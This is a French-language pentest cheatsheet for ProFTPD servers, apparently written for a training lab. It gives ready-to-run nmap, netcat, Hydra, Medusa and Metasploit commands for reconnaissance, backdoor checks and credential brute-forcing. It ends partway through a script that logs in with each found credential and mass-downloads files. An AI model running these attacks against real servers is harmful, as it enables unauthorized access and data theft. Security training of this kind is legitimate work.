# ProFTP Recon - Cheatsheet d'Exploitation

## Vue d'ensemble
Cette cheatsheet couvre les techniques de reconnaissance et d'exploitation des serveurs ProFTPD, incluant l'énumération, les attaques par force brute, l'exploitation de vulnérabilités et les techniques de post-exploitation.

---

## Phase 1: Reconnaissance et détection

### Test de connectivité
```bash
# Vérification de l'accessibilité
ping -c 4 <target>

# Test de connectivité FTP
telnet <target> 21
nc -nv <target> 21
```

### Scan des ports FTP
```bash
# Scan basique du port FTP
nmap -p 21 <target>

# Scan avec détection de version
nmap -sV -p 21 <target>

# Scan complet des ports FTP alternatifs
nmap -p 21,2121,990,989 -sV <target>

# Scan agressif avec scripts
nmap -sS -sV -sC -p 21 --script ftp* <target>
```

### Banner Grabbing
```bash
# Avec netcat
nc -nv <target> 21

# Avec telnet
telnet <target> 21

# Avec nmap
nmap -sV -p 21 <target> --version-intensity 9

# Identification spécifique ProFTPD
nmap -p 21 --script banner <target>
```

---

## Phase 2: Énumération ProFTPD

### Scripts Nmap spécialisés
```bash
# Enumération complète FTP
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <target>

# Test d'accès anonyme
nmap --script ftp-anon -p 21 <target>

# Détection de versions vulnérables
nmap --script ftp-proftpd-backdoor -p 21 <target>

# Test de bounce attack
nmap --script ftp-bounce -p 21 <target>
```

### Test d'accès anonyme
```bash
# Connexion manuelle
ftp <target>
# User: anonymous
# Password: anonymous@domain.com

# Test automatique
echo "anonymous" | ftp <target>
```

### Énumération des utilisateurs
```bash
# Via VRFY (si activé)
telnet <target> 21
VRFY root
VRFY admin
VRFY test

# Avec Metasploit
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run
```

---

## Phase 3: Attaques par force brute

### Avec Hydra (Recommandé)

#### Configuration de base
```bash
# Utilisateur unique, wordlist de mots de passe
hydra -l <username> -P <password_file> ftp://<target>

# Wordlist d'utilisateurs, mot de passe unique
hydra -L <user_file> -p <password> ftp://<target>

# Wordlists multiples (comme dans le lab)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> -t 4 ftp
```

#### Options avancées Hydra
```bash
# Avec limitation de threads et timeout
hydra -L users.txt -P passwords.txt ftp://<target> -t 4 -w 30

# Mode verbose
hydra -L users.txt -P passwords.txt ftp://<target> -V -f

# Avec port personnalisé
hydra -L users.txt -P passwords.txt ftp://<target>:2121 -t 4

# Arrêt à la première réussite
hydra -L users.txt -P passwords.txt ftp://<target> -f -t 10
```

### Avec Nmap Scripts

#### Force brute ciblée
```bash
# Utilisateur spécifique (comme sysadmin dans le lab)
echo "sysadmin" > users.txt
nmap --script ftp-brute --script-args userdb=users.txt -p 21 <target>

# Avec wordlists personnalisées
nmap --script ftp-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt -p 21 <target>

# Force brute basique avec listes par défaut
nmap --script ftp-brute -p 21 <target>
```

### Avec Metasploit
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS false  # Pour trouver tous les comptes
set VERBOSE true
run
```

### Avec Medusa
```bash
# Syntaxe de base
medusa -h <target> -u <username> -P <password_file> -M ftp

# Attaque complète
medusa -h <target> -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -M ftp -t 10
```

---

## Phase 4: Exploitation post-authentification

### Connexion FTP manuelle
```bash
# Connexion basique
ftp <target>
# Entrer username/password

# Connexion avec port personnalisé
ftp <target> 2121

# Mode passif (pour contourner les firewalls)
ftp <target>
passive
```

### Commandes FTP essentielles
```bash
# Navigation
pwd                    # Répertoire courant
ls                     # Lister les fichiers
ls -la                 # Liste détaillée avec fichiers cachés
cd <directory>         # Changer de répertoire
cd ..                  # Répertoire parent

# Transfert de fichiers
get <filename>         # Télécharger un fichier
mget *.txt            # Télécharger plusieurs fichiers
put <filename>        # Uploader un fichier
mput *.txt            # Uploader plusieurs fichiers

# Gestion des modes
binary                # Mode binaire
ascii                 # Mode texte
passive              # Mode passif
active               # Mode actif

# Informations
stat                  # Statut du serveur
syst                  # Type de système
help                  # Aide
```

### Recherche systématique de flags/données

#### Script de collecte automatique
```bash
#!/bin/bash
# ftp_collector.sh

TARGET=$1
CREDS_FILE=$2

while IFS=':' read -r username password; do
    echo "Testing $username:$password"
    
    # Connexion FTP automatique
    ftp -n $TARGET << EOF
user $username $password
passive
binary
prompt off
ls -la
mget *
quit
EOF

    # Organiser les fichiers par utilisateur